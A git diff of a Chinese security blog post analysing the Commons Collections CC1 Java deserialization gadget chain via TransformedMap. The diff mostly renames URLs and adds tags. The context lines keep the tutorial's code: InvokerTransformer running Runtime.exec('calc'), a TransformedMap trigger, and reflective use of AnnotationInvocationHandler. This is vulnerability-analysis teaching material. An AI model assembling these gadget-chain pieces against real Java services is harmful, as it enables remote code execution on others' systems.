@@ -19,27 +19,29 @@
     <meta name="description" content="Java安全的重要拼图">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CC1链分析">
-<meta property="og:url" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:url" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="3xsh0re&#39;Blog">
 <meta property="og:description" content="Java安全的重要拼图">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240708162534863.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710090205947.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710104121758.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710140835192.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710105700846.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710141928459.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710142053339.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710142224933.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711144412509.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711150022111.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711150233063.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711152007941.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240708162534863.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240710090205947.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240710104121758.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240710140835192.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240710105700846.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240710141928459.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240710142053339.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240710142224933.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240711144412509.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240711150022111.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240711150233063.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240711152007941.png">
 <meta property="article:published_time" content="2024-07-08T06:50:49.000Z">
-<meta property="article:modified_time" content="2024-10-09T12:15:16.975Z">
+<meta property="article:modified_time" content="2024-10-14T09:37:00.195Z">
 <meta property="article:author" content="3xsh0re">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="Java安全">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240708162534863.png">
+<meta name="twitter:image" content="https://3xsh0re.github.io/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240708162534863.png">
   
   
   
@@ -446,7 +448,7 @@ mjx-container[display="true"] + br {
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2024年10月9日 晚上
+                    本文最后更新于：2024年10月14日 下午
                   
                 
               </p>
@@ -481,7 +483,7 @@ mjx-container[display="true"] + br {
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.commons.collections;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> {<br>    Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object var1)</span>;<br>}<br></code></pre></td></tr></table></figure>
 
 <p>脆弱类：InvokerTransformer，我们重点看它的transform方法，发现可以执行传入的对象中的方法，显然这里可以执行任意代码。</p>
-<img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240708162534863.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708162534863">
+<img src="/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240708162534863.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708162534863">
 
 <p>下面是InvokerTransformer的一个构造函数：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> {<br>    <span class="hljs-built_in">super</span>();<br>    iMethodName = methodName;<br>    iParamTypes = paramTypes;<br>    iArgs = args;<br>}<br></code></pre></td></tr></table></figure>
@@ -490,12 +492,12 @@ mjx-container[display="true"] + br {
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class}, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>}).transform(Runtime.getRuntime());<br>    }<br>}<br></code></pre></td></tr></table></figure>
 
 <p>直接运行，执行弹出计算器命令：</p>
-<img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710090205947.png" srcset="/img/loading.gif" lazyload class="" title="image-20240710090205947">
+<img src="/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240710090205947.png" srcset="/img/loading.gif" lazyload class="" title="image-20240710090205947">
 
 <h3 id="构造序列化链"><a href="#构造序列化链" class="headerlink" title="构造序列化链"></a>构造序列化链</h3><p>当然在实际的漏洞中，不可能直接就这么触发，一定是经过了多层调用，当恶意payload执行到这里才会造成RCE。我们就这么盲目地去找吗，当然不是，我们这里是反序列化漏洞，所以最顶层的调用一定是某个readObject()方法。</p>
 <p>特地提到这个方法是因为在反序列化漏洞中它起到了关键作用，readObject()方法被重写的的话，反序列化该类时调用便是重写后的readObject()方法，如果该方法书写不当的话就有可能引发恶意代码的执行。</p>
 <p>那么接下来我们继续分析，按住ctrl单击transform函数查看调用它的函数，我们跳转到<code>TransformedMap</code>类的<code>transform</code>函数中</p>
-<img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710104121758.png" srcset="/img/loading.gif" lazyload class="" title="image-20240710104121758">
+<img src="/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240710104121758.png" srcset="/img/loading.gif" lazyload class="" title="image-20240710104121758">
 
 <p>可以发现是一个叫**<code>checkSetValue</code>**的函数，就一行很简单直接调用了transform，我们接着查看对它的调用</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> {<br>    <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>}<br></code></pre></td></tr></table></figure>
@@ -514,19 +516,19 @@ mjx-container[display="true"] + br {
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>    <span class="hljs-comment">// 获取一个runtime实例</span><br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    <span class="hljs-comment">// 第一层</span><br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <br>        <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>});<br>    <span class="hljs-comment">// 第二层</span><br>    Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    map.put(<span class="hljs-string">"Hacking"</span>,<span class="hljs-string">"3xsh0re"</span>);<br><br>    <span class="hljs-comment">// TransformedMap.decorate方法调用TransformedMap的构造方法</span><br>    Map&lt;Object,Object&gt; transformedMap = TransformedMap.<br>                                         decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>    <span class="hljs-comment">// AbstractInputCheckedMapDecorator类中的MapEntry类的setValue()方法（作用是遍历map）</span><br>    <span class="hljs-keyword">for</span>(Map.Entry entry:transformedMap.entrySet()){<br>        entry.setValue(shell);<br>    }<br>}<br></code></pre></td></tr></table></figure>
 
 <p>可以成功弹出计算器：</p>
-<img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710140835192.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240710140835192.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>此时我们右键setValue函数查看调用，发现在AnnotationInvocationHandler类中一处readObject函数对它进行了调用。</p>
-<img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710105700846.png" srcset="/img/loading.gif" lazyload class="" title="image-20240710105700846">
+<img src="/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240710105700846.png" srcset="/img/loading.gif" lazyload class="" title="image-20240710105700846">
 
 <p>注意：如果你的调用中没有出现这个类，你应当下载源码，<a target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/file/6bfaecb8ff77/src/share/classes/sun">jdk下载网页</a>，下载后解压其中/src/share/classes/sun到自己jdk的src文件夹中</p>
-<img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710141928459.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240710141928459.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>找到自己的文件夹，解压进去，</p>
-<img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710142053339.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240710142053339.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>然后在IDEA中项目属性里添加源码路径，CTRL+shift+alt+s打开</p>
-<img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710142224933.png" srcset="/img/loading.gif" lazyload class="" title="image-20240710142224933">
+<img src="/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240710142224933.png" srcset="/img/loading.gif" lazyload class="" title="image-20240710142224933">
 
 <p>ok，现在你已经可以找到我们的最后的入口函数了，可以发现readObject正好符合我们的调用方式，用构造的恶意序列化流进入这处readObject就可以完成CC1链了，但是有一个问题，AnnotationInvocationHandler类不是公开的，仅可在同一个包下可访问也就是在外面无法通过名字来调用，因此<strong>只可以用反射获取这个类</strong>。</p>
 <p>这个类的构造方法为，也就是说需要一个注解类和一个Map类，这个注解类的选取是有讲究的，后面再探，先设置为Override注解</p>
@@ -540,13 +542,13 @@ mjx-container[display="true"] + br {
 
 <h3 id="链子中的小巧思"><a href="#链子中的小巧思" class="headerlink" title="链子中的小巧思"></a>链子中的小巧思</h3><p>可以发现写完这段运行之后并没有弹出计算器，其实一条可用的序列化链的构造是非常精心的，里面有许多弯弯绕绕，并不是应该这么写所以就这么写，每一个环节都有其出现的必要性。这里我们正向调试一番，看看问题到底出现在哪里：</p>
 <p>首先在序列化函数中的readObject方法处打上断点，</p>
-<img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711144412509.png" srcset="/img/loading.gif" lazyload class="" title="image-20240711144412509">
+<img src="/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240711144412509.png" srcset="/img/loading.gif" lazyload class="" title="image-20240711144412509">
 
 <p>你可以选择一步一步调试去分析整个反序列化的过程，这里我就不单步调试了，我们直到obj的最后一层是一个AnnotationInvocationHandler的实例，那么我们就直接在它的readObject函数打上断点，直接恢复项目运行，可以发现到了我们的断点处，然后可以单步调试了</p>
-<img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711150022111.png" srcset="/img/loading.gif" lazyload class="" title="image-20240711150022111">
+<img src="/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240711150022111.png" srcset="/img/loading.gif" lazyload class="" title="image-20240711150022111">
 
 <p>发现在下面判断memberType时，<code>memberType==null</code>，直接就跳转到了函数末尾，所以根本就没有执行之后的序列化过程。</p>
-<img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711150233063.png" srcset="/img/loading.gif" lazyload class="" title="image-20240711150233063">
+<img src="/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240711150233063.png" srcset="/img/loading.gif" lazyload class="" title="image-20240711150233063">
 
 <p>ok，这里出问题，那么怎么解决呢，找到memberTypes从哪里来的，在上面几行代码中，</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">annotationType = AnnotationType.getInstance(type);<br>Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br></code></pre></td></tr></table></figure>
@@ -558,7 +560,7 @@ mjx-container[display="true"] + br {
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 第二层</span><br>Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>map.put(<span class="hljs-string">"value"</span>,<span class="hljs-string">"3xsh0re"</span>);<br><span class="hljs-comment">//...</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> annotationConstructor.newInstance(Target.class, transformedMap);<br></code></pre></td></tr></table></figure>
 
 <p>重新调试到此处，发现已经成功绕过第一层if了</p>
-<img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711152007941.png" srcset="/img/loading.gif" lazyload class="" title="image-20240711152007941">
+<img src="/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/image-20240711152007941.png" srcset="/img/loading.gif" lazyload class="" title="image-20240711152007941">
 
 <p>此时我们运行整个代码发现报错了，这是为什么呢，其实是因为Runtime类没有继承serialize接口，所以runtime对象不能被序列化，自然也不能被反序列化。这里解决方法，非常巧妙，<strong>虽然Runtime对象不可以被序列化，但是Class对象可以被序列化。</strong>那么结合InvokerTransformer和反射可以写出下面的代码：</p>
 <p>其实非常好理解，比如第一个，就是执行<code>getDeclaredMethod</code>找到<code>getRuntime</code>函数。</p>
@@ -626,6 +628,36 @@ mjx-container[display="true"] + br {
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="category-chain-item">漏洞分析</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#漏洞分析</a>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+    </div>
   
 </div>
 
@@ -636,7 +668,7 @@ mjx-container[display="true"] + br {
   <div class="license-box my-3">
     <div class="license-title">
       <div>CC1链分析</div>
-      <div>https://3xsh0re.github.io/2024/07/08/CC1链分析/</div>
+      <div>https://3xsh0re.github.io/2024/07/08/CC1链-TransformedMap分析/</div>
     </div>
     <div class="license-meta">
       
@@ -680,9 +712,9 @@ mjx-container[display="true"] + br {
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/" title="CVE-2023-46604分析">
+                      <a href="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/" title="CC1链分析">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CVE-2023-46604分析</span>
+                        <span class="hidden-mobile">CC1链分析</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -690,8 +722,8 @@ mjx-container[display="true"] + br {
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/07/08/CC1%E9%93%BE-TransformedMap%E5%88%86%E6%9E%90/" title="CC1链分析">
-                        <span class="hidden-mobile">CC1链分析</span>
+                      <a href="/2024/06/28/%E8%AF%A6%E8%A7%A3SSL-TLS/" title="详解SSL/TLS">
+                        <span class="hidden-mobile">详解SSL/TLS</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
